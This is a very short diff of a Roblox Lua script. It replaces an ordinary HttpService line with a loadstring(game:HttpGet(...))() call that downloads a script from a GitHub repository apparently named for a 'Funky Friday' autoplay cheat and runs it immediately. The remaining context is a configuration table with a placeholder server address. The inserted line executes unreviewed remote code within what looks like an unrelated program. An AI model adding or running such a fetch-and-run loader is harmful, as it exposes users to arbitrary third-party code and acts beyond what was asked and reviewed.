@@ -1,4 +1,5 @@
-local HttpService = game:GetService("HttpService")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
+
 
 local CONFIGURATION = {
 	DOMAIN = "http://xxx.xxx.xxx.xxx:3000";
